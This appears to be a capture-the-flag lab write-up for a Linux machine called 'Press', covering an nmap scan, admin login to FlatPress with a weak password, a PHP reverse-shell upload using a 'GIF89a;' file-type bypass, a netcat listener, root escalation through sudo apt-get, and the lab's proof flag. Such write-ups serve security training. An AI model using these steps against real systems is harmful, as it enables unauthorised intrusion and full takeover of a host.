# Linux - Press

---

### Host Info

- We are given an intermediate machine with IP of `192.168.181.29` . We can first use `nmap` to scan over it.
    
    ```bash
    > nmap -sCV -A -Pn -O -p- 192.168.181.29 -oN tcpnmap.md
    > sudo nmap -sU -Pn 192.168.181.29 --top-ports=100 --reason -oN udpnmap.md
    ```
    
    ```bash
    # TCP
    
    PORT     STATE SERVICE VERSION
    22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
    | ssh-hostkey: 
    |   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
    |   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
    |_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
    
    80/tcp   open  http    Apache httpd 2.4.56 ((Debian))
    |_http-title: Lugx Gaming Shop HTML5 Template
    |_http-server-header: Apache/2.4.56 (Debian)
    
    8089/tcp open  http    Apache httpd 2.4.56 ((Debian))
    |_http-server-header: Apache/2.4.56 (Debian)
    |_http-generator: FlatPress fp-1.2.1
    |_http-title: FlatPress
    
    Device type: general purpose
    Running: Linux 5.X
    OS CPE: cpe:/o:linux:linux_kernel:5
    OS details: Linux 5.0 - 5.14
    Network Distance: 4 hops
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    ```
    

### Important Info

```bash
N/A
```

### Initial Foothold

- We notice `port 80` is open with http server. We tried visit webpage and get a static page. Tried to click “SIGN IN” but nothing shows up.
    
    ![image.png](Linux%20-%20Press%201b0553bebf0f8028ba75ecc88dfb134f/image.png)
    

- Check `port 8089` and we can get a `FlatPress` welcome page. There’s a login option for admin.
    
    ![image.png](Linux%20-%20Press%201b0553bebf0f8028ba75ecc88dfb134f/image%201.png)
    
    Click login and then try weak password `admin : password` , then we can access into the administration page.
    
    ![image.png](Linux%20-%20Press%201b0553bebf0f8028ba75ecc88dfb134f/image%202.png)
    

- Googled “FlatPress exploit”, we can get a very useful information → https://github.com/flatpressblog/flatpress/issues/152.
    
    By following this Github issue repot, we are able to upload a php reverse shell file to the “Uploader” and then execute it in “Media manager”. ( I used ivan-sincek php reverse shell here, need to change your Kali IP and port in the file.)
    
    At the beginning of your `shell.php` , you need to add `GIF89a;`  to bypass file type verification.
    
    ![image.png](Linux%20-%20Press%201b0553bebf0f8028ba75ecc88dfb134f/image%203.png)
    
    ![image.png](Linux%20-%20Press%201b0553bebf0f8028ba75ecc88dfb134f/image%204.png)
    

- Listen on your Kali, we can get `www-date` as low-privilege shell.
    
    ```bash
    > rlwrap nc -lvnp 9090
    ```
    
    ![image.png](Linux%20-%20Press%201b0553bebf0f8028ba75ecc88dfb134f/image%205.png)
    

### Privilege Escalation

- By running `sudo -l` , we found that we can sudo run “apt-get” without password. Search over `GTFOBins` , we can find a way to PE by “Sudo”.
    
    ```bash
    > sudo -l
    
    > sudo apt-get changelog apt
    > !/bin/sh
    
    > whoami
    	: root
    	
    - proof.txt : 0896d050849aec32ccb6978f202b5730
    ```
    
    ![image.png](Linux%20-%20Press%201b0553bebf0f8028ba75ecc88dfb134f/image%206.png)
    
    ![image.png](Linux%20-%20Press%201b0553bebf0f8028ba75ecc88dfb134f/image%207.png)
    
    ![image.png](Linux%20-%20Press%201b0553bebf0f8028ba75ecc88dfb134f/image%208.png)
    
    ![image.png](Linux%20-%20Press%201b0553bebf0f8028ba75ecc88dfb134f/image%209.png)
    

### Reference

- https://github.com/flatpressblog/flatpress/issues/152
- https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php
- https://gtfobins.github.io/gtfobins/apt-get/